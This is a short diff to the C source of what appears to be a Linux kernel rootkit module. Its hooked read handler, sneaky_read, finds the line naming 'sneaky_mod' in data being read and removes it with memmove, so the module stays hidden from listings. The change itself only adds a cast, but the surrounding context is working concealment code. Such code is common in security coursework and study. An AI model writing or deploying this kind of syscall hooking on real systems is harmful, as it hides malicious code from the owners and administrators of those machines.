@@ -128,7 +128,7 @@ asmlinkage ssize_t sneaky_read(struct pt_regs *regs) {
     void * begin = (void *)regs->si;
     char * first = findPos((char *)begin, "sneaky_mod", length);
     if (first != NULL) {
-        char * second = findPos(first, "\n", length - (first - (char *)begin));
+        char * second = findPos((char *)first, "\n", length - (first - (char *)begin));
         if (second != NULL) {
             memmove(first, second + 1, length - (second - (char *)begin) - 1);
             length = length - (ssize_t)(second - first) - 1;
